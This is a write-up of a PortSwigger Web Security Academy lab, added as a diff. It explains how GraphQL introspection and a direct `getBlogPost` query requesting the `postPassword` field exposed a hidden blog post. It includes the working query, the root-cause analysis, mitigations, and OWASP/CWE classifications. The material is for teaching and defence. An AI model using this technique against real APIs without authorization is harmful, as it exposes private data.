@@ -1,0 +1,334 @@
+# PortSwigger Web Security Academy
+
+## GraphQL API: Hidden Blog Post and Sensitive Field Exposure
+
+## Objective
+
+Identify and exploit a GraphQL API vulnerability that allows access to a hidden blog post and disclosure of its password.
+
+The objective was to use GraphQL introspection to identify sensitive functionality and then retrieve the password associated with the hidden blog post with ID `3`.
+
+---
+
+## Technologies Involved
+
+* GraphQL
+* HTTP/2
+* JSON
+* Burp Suite Community Edition
+* Web application API
+
+---
+
+## Reconnaissance
+
+The application was accessed through Burp Suite's browser and the blog functionality was inspected.
+
+Reviewing **Proxy → HTTP history** revealed that blog posts were retrieved through a GraphQL endpoint:
+
+```http
+POST /graphql/v1
+```
+
+The application used a GraphQL query to retrieve the available blog posts.
+
+The response contained sequential blog post identifiers. However, the sequence contained a notable gap:
+
+```text
+1
+2
+4
+5
+...
+```
+
+Blog post ID `3` was missing.
+
+This suggested that a blog post existed in the backend but was not exposed through the normal blog listing.
+
+---
+
+## Identification
+
+The GraphQL request was sent to Burp Repeater.
+
+A GraphQL introspection query was generated using:
+
+**Right-click → GraphQL → Set introspection query**
+
+The request was submitted to the GraphQL endpoint.
+
+The introspection response revealed the `BlogPost` type and its available fields:
+
+```text
+id
+image
+title
+author
+date
+summary
+paragraphs
+isPrivate
+postPassword
+```
+
+The presence of the following field was particularly significant:
+
+```text
+postPassword
+```
+
+The introspection also revealed that the root `query` type exposed:
+
+```text
+getBlogPost(id: Int!)
+```
+
+This meant that individual blog posts could be requested directly using their numeric identifier.
+
+---
+
+## Exploitation
+
+The original GraphQL query was modified to invoke `getBlogPost` directly.
+
+The hidden post identifier was set to:
+
+```json
+{
+  "id": 3
+}
+```
+
+The requested GraphQL fields were modified to include the sensitive `postPassword` field.
+
+The resulting query was conceptually:
+
+```graphql
+query getBlogPost($id: Int!) {
+    getBlogPost(id: $id) {
+        id
+        title
+        summary
+        postPassword
+    }
+}
+```
+
+The corresponding variables were:
+
+```json
+{
+  "id": 3
+}
+```
+
+The request was submitted to:
+
+```http
+POST /graphql/v1
+```
+
+The server returned the previously hidden blog post and included the value of the `postPassword` field.
+
+The password was extracted from the response and submitted through the laboratory's **Submit solution** functionality.
+
+The lab was successfully solved.
+
+---
+
+## Evidence
+
+### GraphQL introspection
+
+The `BlogPost` type exposed the sensitive field:
+
+```text
+postPassword
+```
+
+The GraphQL root query also exposed:
+
+```text
+getBlogPost(id: Int!)
+```
+
+### Hidden object
+
+The public blog listing contained a gap in the sequential identifiers:
+
+```text
+1
+2
+4
+5
+```
+
+The missing identifier was:
+
+```text
+3
+```
+
+### Exploitation request
+
+The application accepted a direct request for the hidden object:
+
+```graphql
+query getBlogPost($id: Int!) {
+    getBlogPost(id: $id) {
+        id
+        title
+        summary
+        postPassword
+    }
+}
+```
+
+with:
+
+```json
+{
+  "id": 3
+}
+```
+
+### Result
+
+The response contained:
+
+```text
+postPassword: [redacted]
+```
+
+The exposed password was sufficient to complete the laboratory.
+
+---
+
+## Root Cause
+
+The primary root cause was insufficient authorization enforcement within the GraphQL API.
+
+The application relied on the normal blog listing to determine which posts were visible but did not adequately enforce access restrictions when an individual post was requested directly.
+
+Additionally, the API exposed a sensitive `postPassword` field through the GraphQL schema.
+
+As a result, an attacker could:
+
+1. Discover the GraphQL schema.
+2. Identify sensitive fields and available queries.
+3. Infer the existence of an unlisted object.
+4. Request the object directly using its identifier.
+5. Retrieve a sensitive field that should not have been accessible.
+
+---
+
+## Impact
+
+Successful exploitation could result in:
+
+* Disclosure of blog post passwords.
+* Unauthorized access to private content.
+* Exposure of sensitive application data.
+* Enumeration of backend objects.
+* Increased attack surface through excessive GraphQL schema exposure.
+
+If similar authorization weaknesses existed on other GraphQL types or fields, the impact could extend beyond blog posts and potentially expose additional sensitive application data.
+
+---
+
+## Mitigations
+
+### 1. Implement server-side authorization
+
+Authorization must be enforced at the resolver level rather than relying on whether an object appears in a public listing.
+
+For example:
+
+```text
+getBlogPost(id)
+    ↓
+Verify authorization
+    ↓
+Return object only if authorized
+```
+
+### 2. Protect sensitive fields
+
+Sensitive fields such as:
+
+```text
+postPassword
+```
+
+should not be exposed to unauthorized clients.
+
+Where possible, sensitive internal properties should not be part of the public GraphQL schema at all.
+
+### 3. Restrict GraphQL introspection in production
+
+Consider disabling or restricting introspection for unauthenticated users in production environments.
+
+However, disabling introspection alone does not fix the underlying authorization problem.
+
+### 4. Avoid relying on hidden identifiers
+
+Removing an object from:
+
+```graphql
+getAllBlogPosts
+```
+
+does not protect it.
+
+Every object returned by:
+
+```graphql
+getBlogPost(id)
+```
+
+must independently undergo authorization checks.
+
+### 5. Apply field-level authorization
+
+GraphQL APIs should enforce authorization not only at the object level but also at the field level when sensitive fields are involved.
+
+For example:
+
+```text
+BlogPost
+ ├── title             → public
+ ├── summary           → public
+ ├── content           → public/private depending on authorization
+ └── postPassword      → restricted
+```
+
+---
+
+## Classifications
+
+### OWASP
+
+* **OWASP API1: Broken Object Level Authorization (BOLA)**
+* **OWASP API3: Broken Object Property Level Authorization**
+* **OWASP API9: Improper Inventory Management** — potentially relevant where unnecessary schema exposure contributes to attack surface.
+
+### CWE
+
+* **CWE-639: Authorization Bypass Through User-Controlled Key**
+* **CWE-862: Missing Authorization**
+* **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**
+
+---
+
+## Conclusions
+
+The application exposed a GraphQL endpoint that allowed clients to discover the underlying API schema through introspection.
+
+The schema revealed both a direct `getBlogPost(id)` query and a sensitive `postPassword` field.
+
+By identifying a gap in the sequential blog post identifiers, the hidden post with ID `3` could be inferred. The application then allowed the post to be requested directly without performing sufficient authorization checks.
+
+By adding `postPassword` to the GraphQL selection set, the sensitive password was returned by the server.
+
+The key security lesson is that **hiding an object from the application's user interface or from a listing query does not constitute authorization**. Access controls must be enforced server-side for every object and sensitive field exposed through the GraphQL API.
